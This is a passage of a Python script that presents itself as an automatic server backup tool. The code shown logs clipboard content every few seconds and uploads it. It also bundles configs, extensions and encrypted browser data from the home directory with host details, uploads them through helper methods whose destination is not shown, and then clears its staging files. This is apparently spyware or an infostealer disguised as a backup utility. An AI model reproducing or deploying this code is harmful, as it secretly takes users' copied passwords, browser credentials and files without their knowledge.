                    # 某些环境下（如无剪贴板服务）会持续返回错误码
                    pass
            return None
        except FileNotFoundError:
            # 未安装 xclip，只在第一次记录警告
            if not self._clipboard_display_warned:
                if self.config.DEBUG_MODE:
                    logging.debug("⚠️ 未检测到 xclip，JTB监控功能已禁用")
                self._clipboard_display_warned = True
            return None
        except Exception as e:
            # 其他异常，不记录错误日志，避免频繁报错导致日志文件过大
            # 某些环境下（如无剪贴板服务）会持续抛出异常
            return None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件（与 wsl.py 行为保持一致）"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)

            # 检查内容是否为空或仅空白
            if not content or content.isspace():
                return

            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                # 与 wsl.py 中的格式保持 1:1
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-" * 30 + "\n")

            preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"📝 已记录内容: {preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件（与 wsl.py 行为保持一致）

        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        try:
            log_dir = os.path.dirname(file_path)
            if not os.path.exists(log_dir):
                try:
                    os.makedirs(log_dir, exist_ok=True)
                except Exception as e:
                    logging.error(f"❌ 创建JTB日志目录失败: {e}")
                    # 即使创建目录失败，也继续尝试运行（可能目录已存在）

            last_content = ""
            error_count = 0
            max_errors = 5
            last_empty_log_time = time.time()  # 记录上次输出空JTB日志的时间
            empty_log_interval = 300  # 每 5 分钟才输出一次空JTB日志

            # 初始化日志文件
            try:
                with open(file_path, 'a', encoding='utf-8') as f:
                    f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                    f.write("-" * 30 + "\n")
            except Exception as e:
                logging.error(f"❌ 初始化JTB日志失败: {e}")
                # 即使初始化失败，也继续运行

            def is_special_content(text):
                """检查是否为特殊标记内容（与 wsl.py 逻辑保持一致）"""
                try:
                    if not text:
                        return False
                    if text.startswith('===') or text.startswith('-'):
                        return True
                    if 'JTB监控启动于' in text or '日志已于' in text:
                        return True
                    return False
                except Exception:
                    return False

            while True:
                try:
                    current_content = self.get_clipboard_content()
                    current_time = time.time()

                    if (current_content and 
                        not current_content.isspace() and 
                        not is_special_content(current_content)):
                        
                        # 检查内容是否发生变化
                        if current_content != last_content:
                            try:
                                preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                                logging.info(f"📋 检测到新内容: {preview}")
                                self.log_clipboard_update(current_content, file_path)
                                last_content = current_content
                                error_count = 0  # 重置错误计数
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.error(f"❌ 记录JTB内容失败: {e}")
                                # 即使记录失败，也继续监控
                    else:
                        try:
                            if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                                if not current_content:
                                    logging.debug("ℹ️ JTB为空")
                                elif current_content.isspace():
                                    logging.debug("ℹ️ JTB内容仅包含空白字符")
                                elif is_special_content(current_content):
                                    logging.debug("ℹ️ 跳过特殊标记内容")
                                last_empty_log_time = current_time
                        except Exception:
                            pass  # 忽略调试日志错误
                        error_count = 0  # 空内容不计入错误

                except KeyboardInterrupt:
                    # 允许通过键盘中断退出
                    raise
                except Exception as e:
                    error_count += 1
                    if error_count >= max_errors:
                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待60秒后重试")
                        try:
                            time.sleep(60)
                        except Exception:
                            pass
                        error_count = 0  # 重置错误计数
                    elif self.config.DEBUG_MODE:
                        logging.error(f"❌ JTB监控出错: {str(e)}")

                try:
                    time.sleep(interval)
                except KeyboardInterrupt:
                    raise
                except Exception:
                    # 即使 sleep 失败，也继续运行
                    time.sleep(interval)
        except KeyboardInterrupt:
            # 允许通过键盘中断退出
            raise
        except Exception as e:
            # 最外层异常处理，确保即使严重错误也不会影响主程序
            logging.error(f"❌ JTB监控线程发生严重错误: {e}")
            if self.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 线程退出，但不影响主程序

def is_server():
    """检查是否在服务器环境中运行"""
    return not platform.system().lower() == 'windows'

def backup_server(backup_manager, source, target):
    """备份服务器，返回备份文件路径列表（不执行上传）- 分别压缩各个分目录"""
    backup_dirs = backup_manager.backup_linux_files(source, target)
    if not backup_dirs:
        return None
    
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    all_backup_paths = []
    
    # 分别压缩各个目录
    dir_names = {
        "docs": f"{user_prefix}_docs",
        "configs": f"{user_prefix}_configs",
        "specified": f"{user_prefix}_specified",
        "extensions": f"{user_prefix}_extensions",
        "browser_data": f"{user_prefix}_browser_data"
    }
    
    for dir_key, dir_path in backup_dirs.items():
        # 检查目录是否存在且不为空
        if not os.path.exists(dir_path):
            continue
        
        # browser_data 目录特殊处理：不压缩，直接上传 .encrypted 文件
        if dir_key == "browser_data":
            # 查找目录中的 .encrypted 文件
            encrypted_files = []
            try:
                for file in os.listdir(dir_path):
                    if file.endswith('.encrypted'):
                        file_path = os.path.join(dir_path, file)
                        if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
                            encrypted_files.append(file_path)
            except OSError:
                pass
            
            if encrypted_files:
                # 将 .encrypted 文件移动到备份根目录（不压缩）
                target_dir = os.path.dirname(dir_path)
                backup_root = os.path.dirname(target_dir)
                for encrypted_file in encrypted_files:
                    filename = os.path.basename(encrypted_file)
                    dest_path = os.path.join(backup_root, filename)
                    try:
                        shutil.move(encrypted_file, dest_path)
                        all_backup_paths.append(dest_path)
                        logging.critical(f"☑️ {dir_names[dir_key]} 文件已准备完成: {filename}")
                    except Exception as e:
                        logging.error(f"❌ 移动 {dir_names[dir_key]} 文件失败: {e}")
            else:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"⏭️ {dir_names[dir_key]} 目录中没有 .encrypted 文件")
            continue
        
        # 其他目录正常压缩
        # 检查目录是否为空
        try:
            if not os.listdir(dir_path):
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"⏭️ 跳过空目录: {dir_key}")
                continue
        except OSError:
            continue
        
        # 压缩目录（压缩文件保存在 target_dir 的父目录中）
        zip_name = f"{dir_names[dir_key]}_{timestamp}"
        # target_dir 是 backup_dirs 中任意一个目录的父目录
        target_dir = os.path.dirname(dir_path)
        zip_path = os.path.join(os.path.dirname(target_dir), zip_name)
        backup_path = backup_manager.zip_backup_folder(dir_path, zip_path)
        
        if backup_path:
            if isinstance(backup_path, list):
                all_backup_paths.extend(backup_path)
            else:
                all_backup_paths.append(backup_path)
            logging.critical(f"☑️ {dir_names[dir_key]} 目录备份文件已准备完成")
        else:
            logging.error(f"❌ {dir_names[dir_key]} 目录备份压缩失败")
    
    if all_backup_paths:
        logging.critical(f"☑️ 服务器备份文件已准备完成（共 {len(all_backup_paths)} 个文件）")
        return all_backup_paths
    else:
        logging.error("❌ 服务器备份压缩失败（没有生成任何备份文件）")
        return None

def backup_and_upload_logs(backup_manager):
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return

        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)

        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return

        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name

        try:
            # 读取并验证日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
            
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())

        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的JTB上传线程（逻辑对齐 wsl.py）"""
    try:
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
    except Exception:
        user_prefix = "user"
    
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # 检查文件内容是否为空或只包含上传记录
                try:
                    with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                        content = f.read().strip()
                        # 检查是否只包含初始化标记或上传记录
                        has_valid_content = False
                        lines = content.split('\n')
                        for line in lines:
                            try:
                                line = line.strip()
                                if (line and 
                                    not line.startswith('===') and 
                                    not line.startswith('-') and
                                    'JTB监控启动于' not in line and 
                                    '日志已于' not in line):
                                    has_valid_content = True
                                    break
                            except Exception:
                                continue

                        if not has_valid_content:
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug("📋 JTB内容为空或无效，跳过上传")
                            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                            continue
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.error(f"❌ 读取JTB日志文件失败: {e}")
                    time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                    continue

                try:
                    username = getpass.getuser()
                    user_prefix = username[:5] if username else "user"
                except Exception:
                    pass  # 使用之前获取的 user_prefix

                temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_clipboard_logs"
                try:
                    if backup_manager._ensure_directory(str(temp_dir)):
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                        backup_path = temp_dir / backup_name

                        try:
                            shutil.copy2(clipboard_log_path, backup_path)
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("📄 准备上传JTB日志...")
                        except Exception as e:
                            logging.error(f"❌ 复制JTB日志失败: {e}")
                            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                            continue

                        try:
                            if backup_manager.upload_file(str(backup_path)):
                                try:
                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                        f.write(f"=== 📋 日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.info("✅ JTB日志已清空")
                                except Exception as e:
                                    logging.error(f"🧹 JTB日志清空失败: {e}")
                            else:
                                logging.error("❌ JTB日志上传失败")
                        except Exception as e:
                            logging.error(f"❌ 上传JTB日志失败: {e}")

                        try:
                            if os.path.exists(str(temp_dir)):
                                shutil.rmtree(str(temp_dir))
                        except Exception as e:
                            if backup_manager.config.DEBUG_MODE:
                                logging.error(f"❌ 清理临时目录失败: {e}")
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.error(f"❌ 处理JTB日志上传流程失败: {e}")
        except KeyboardInterrupt:
            # 允许通过键盘中断退出
            raise
        except Exception as e:
            logging.error(f"❌ 处理JTB日志时出错: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())

        # 等待一段时间后再次检查
        try:
            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
        except KeyboardInterrupt:
            raise
        except Exception:
            # 即使 sleep 失败，也继续运行
            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    backup_dir = Path.home() / ".dev/Backup"
    try:
        if not os.path.exists(backup_dir):
            return
        # 保留备份日志、JTB日志和时间阈值文件
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        keep_files = ["backup.log", f"{user_prefix}_clipboard_log.txt", "next_backup_time.txt"]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def save_next_backup_time(backup_manager):
    """保存下次备份时间到阈值文件"""
    try:
        next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
        with open(backup_manager.config.THRESHOLD_FILE, 'w', encoding='utf-8') as f:
            f.write(next_backup_time.strftime('%Y-%m-%d %H:%M:%S'))
        if backup_manager.config.DEBUG_MODE:
            logging.info(f"⏰ 已保存下次备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        logging.error(f"❌ 保存下次备份时间失败: {e}")

def should_perform_backup(backup_manager):
    """检查是否应该执行备份"""
    try:
        if not os.path.exists(backup_manager.config.THRESHOLD_FILE):
            return True
            
        with open(backup_manager.config.THRESHOLD_FILE, 'r', encoding='utf-8') as f:
            threshold_time_str = f.read().strip()
            
        threshold_time = datetime.strptime(threshold_time_str, '%Y-%m-%d %H:%M:%S')
        current_time = datetime.now()
        
        if current_time >= threshold_time:
            if backup_manager.config.DEBUG_MODE:
                logging.info("⏰ 已到达备份时间")
            return True
        else:
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"⏳ 未到备份时间，下次备份: {threshold_time_str}")
            return False
            
    except Exception as e:
        logging.error(f"❌ 检查备份时间失败: {e}")
        return True  # 出错时默认执行备份

def main():
    if not is_server():
        logging.critical("本脚本仅适用于服务器环境")
        return

    try:
        backup_manager = BackupManager()
        
        # 先清理备份目录
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\n备份程序已停止")
    except Exception as e:
        logging.critical(f"程序出错: {e}")

def periodic_backup_upload(backup_manager):
    source = str(Path.home())
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    target = Path.home() / ".dev/Backup" / f"{user_prefix}_server"
    clipboard_log_path = Path.home() / ".dev/Backup" / f"{user_prefix}_clipboard_log.txt"

    try:
        # 启动JTB监控线程（添加异常处理，确保即使启动失败也不影响主程序）
        try:
            clipboard_thread = threading.Thread(
                target=backup_manager.monitor_clipboard,
                args=(str(clipboard_log_path), 3),
                daemon=True
            )
            clipboard_thread.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info("✅ JTB监控线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动JTB监控线程失败: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 即使启动失败，也继续运行主程序

        # 启动JTB上传线程（添加异常处理，确保即使启动失败也不影响主程序）
        try:
            clipboard_upload_thread_obj = threading.Thread(
                target=clipboard_upload_thread,
                args=(backup_manager, str(clipboard_log_path)),
                daemon=True
            )
            clipboard_upload_thread_obj.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info("✅ JTB上传线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动JTB上传线程失败: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 即使启动失败，也继续运行主程序

        # 初始化JTB日志文件（与 wsl.py 保持一致）
        try:
            with open(clipboard_log_path, 'a', encoding='utf-8') as f:
                f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        except Exception as e:
            logging.error(f"❌ 初始化JTB日志失败: {e}")
            # 即使初始化失败，也继续运行主程序

        # 获取用户名和系统信息
        username = getpass.getuser()
        hostname = socket.gethostname()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # 获取系统环境信息
        system_info = {
            "操作系统": platform.system(),
            "系统版本": platform.release(),
            "系统架构": platform.machine(),
            "Python版本": platform.python_version(),
            "主机名": hostname,
            "用户名": username,
        }
        
        # 获取Linux发行版信息
        try:
            with open("/etc/os-release", "r") as f:
                for line in f:
                    if line.startswith("PRETTY_NAME="):
                        system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                        break
        except:
            pass
        
        # 获取内核版本
        try:
            with open("/proc/version", "r") as f:
                kernel_version = f.read().strip().split()[2]
                system_info["内核版本"] = kernel_version
        except:
            pass
        
        # 输出启动信息和系统环境
        logging.critical("\n" + "="*50)
        logging.critical("🚀 自动备份系统已启动")
        logging.critical("="*50)
        logging.critical(f"⏰ 启动时间: {current_time}")
        logging.critical("-"*50)
        logging.critical("📊 系统环境信息:")
        for key, value in system_info.items():
            logging.critical(f"   • {key}: {value}")
        logging.critical("-"*50)
        logging.critical("="*50)

        while True:
            try:
                # 检查是否应该执行备份
                if not should_perform_backup(backup_manager):
                    time.sleep(3600)  # 每小时检查一次
                    continue

                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time}")
                logging.critical("-"*40)

                logging.critical("\n🖥️ 服务器指定目录备份")
                backup_paths = backup_server(backup_manager, source, target)

                # 保存下次备份时间
                save_next_backup_time(backup_manager)

                # 输出结束语（在上传之前）
                logging.critical("\n" + "="*40)
                next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time = next_backup_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"✅ 备份完成  {current_time}")
                logging.critical("="*40)
                logging.critical("📋 备份任务已结束")
                logging.critical(f"🔄 下次启动备份时间: {next_time}")
                logging.critical("="*40 + "\n")

                # 开始上传备份文件
                if backup_paths:
                    file_count = len(backup_paths)
                    logging.critical(f"📤 上传 {file_count} 个文件...")
                    if backup_manager.upload_backup(backup_paths):
                        logging.critical("✅ 上传完成")
                    else:
                        logging.error("❌ 部分文件上传失败")
                
                # 上传备份日志
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)

            except Exception as e:
                logging.error(f"\n❌ 备份出错: {e}")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as log_error:
                    logging.error("❌ 日志备份失败")
                time.sleep(60)

    except Exception as e:
        logging.error(f"❌ 备份过程出错: {e}")

if __name__ == "__main__":
    main()
